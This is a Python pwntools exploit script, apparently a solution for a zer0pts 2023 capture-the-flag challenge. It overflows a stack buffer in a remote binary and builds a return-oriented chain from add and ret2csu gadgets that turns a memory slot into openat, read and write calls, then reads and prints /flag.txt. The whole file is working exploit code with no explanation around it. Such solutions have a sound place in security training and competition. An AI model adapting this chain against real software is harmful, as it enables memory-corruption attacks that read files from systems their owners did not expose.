#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

# excutable mapped base
base = 0x7fffb7dd6000

exe = ELF('./bin/vuln')
libc = ELF('./lib/libc.so.6')
exe.address = base

p = remote('pwn.2023.zer0pts.com', 9005)

gadget_add = base+0x0000000000001192 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret
gadget_csu = base+0x000000000000129a # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
call_csu = base+0x0000000000001280
call_csu2 = base+0x0000000000001289
pop_rdi = base+0x00000000000012a3 # pop rdi ; ret
pop_r15 = base+0x00000000000012a2 # pop r15 ; ret
def add_gadget(address, val):
  global gadget_add
  global gadget_csu
  return p64(gadget_csu)+p64(val & 0xffffffff)+p64(address+0x3d)+p64(0)*4+p64(gadget_add)

def csucall(func,arg1,arg2,arg3):
  return p64(gadget_csu)+p64(0)+p64(1)+p64(arg1)+p64(arg2)+p64(arg3)+p64(func)+p64(call_csu)+p64(0)*7

# write a string to memory with add gadget
def write_string(addr, data):
  data += b'\x00'*(4-(len(data)%4))              # pad to a multiple of 4
  p = b''
  for i in range(len(data)>>2):
    p += add_gadget(addr+(i<<2), u32(data[(i<<2):(i<<2)+4]))
  return p

# open read write shellcode
payload = b'A'*0x108
payload += p64(0x6161616161616100) + p64(0xdeadbeef)
payload += write_string(base+0x4040, b'/flag.txt')
payload += add_gadget(base+0x4010,  (libc.sym['openat']-libc.sym['_IO_2_1_stdout_']) )
payload += p64(gadget_csu)+p64(0)+p64(1)+p64(1)+p64(base+0x4040)+p64(0)+p64(base+0x4010)+p64(call_csu)
payload += p64(0)+p64((libc.sym['read']-libc.sym['openat']) & 0xffffffff)+p64((base+0x4010)+0x3d)+p64(0)*4+p64(gadget_add)
payload += p64(gadget_csu)+p64(0)+p64(1)+p64(3)+p64(base+0x4200)+p64(0x100)+p64(base+0x4010)+p64(call_csu)
payload += p64(0)+p64((libc.sym['write']-libc.sym['read']) & 0xffffffff)+p64((base+0x4010)+0x3d)+p64(0)*4+p64(gadget_add)
payload += p64(gadget_csu)+p64(0)+p64(1)+p64(1)+p64(base+0x4200)+p64(0x100)+p64(base+0x4010)+p64(call_csu)


sla('something\n', payload)

p.interactive()

